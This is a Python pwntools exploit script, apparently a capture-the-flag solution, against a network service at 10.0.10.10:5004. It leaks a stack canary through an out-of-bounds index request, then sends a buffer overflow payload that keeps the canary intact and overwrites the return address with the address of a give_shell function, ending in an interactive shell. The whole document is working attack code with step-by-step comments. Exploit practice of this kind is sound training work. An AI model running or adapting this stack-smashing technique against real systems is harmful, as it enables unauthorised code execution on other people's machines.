from pwn import *

r = remote("10.0.10.10", 5004)

context.log_level = "DEBUG"

# Wait for the vendor to ask us for a number
r.recvuntil("> ")
# Request index 9 to leak the stack cookie
r.sendline("9")

# Parse out the value that the vendor gave us
r.recvuntil("Index 9 contains ")
cookie = int(r.recvuntil(".").rstrip("."), 0)

# Quit the value inspection phase
r.recvuntil("> ")
r.sendline("-1")

# Payload: some padding, then the cookie
#          then saved RBP (more padding), then the address of give_shell
r.recvuntil("Oh, and just so I know, what's your name?\n")
r.sendline(("a" * 8) + p64(cookie) + ("a" * 8) + p64(0x4006B7))

# Shell!
r.interactive()
